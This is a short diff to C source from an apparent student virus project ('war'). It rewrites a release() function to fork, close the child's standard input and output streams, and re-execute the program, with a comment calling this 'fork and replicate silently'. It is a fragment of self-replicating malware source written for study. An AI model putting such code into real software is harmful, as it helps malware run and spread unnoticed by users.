@@ -6,14 +6,14 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:50 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/11 00:01:22 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/11 12:22:54 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "war.h"
 
 /*
-  Release: e_e
+  Release: fork and replicate silently
 */
 void		release(t_data *data)
 {
@@ -31,11 +31,17 @@ void		release(t_data *data)
 		goto next;
 
 	pid_t child;
-	char *av[2] = {data->name, "--help"};
+	char help[] = "--help";
+	char *av[] = {data->name, help, NULL};
 	child = _fork();
+	if (child < 0)
+		goto next;
 	if (child == 0)
 	{
-		_execve(data->name, av, NULL);
+		_close(STDIN_FILENO);
+		_close(STDOUT_FILENO);
+		_close(STDERR_FILENO);
+		_execve(av[0], av, NULL);
 		_exit(0);
 	}
 
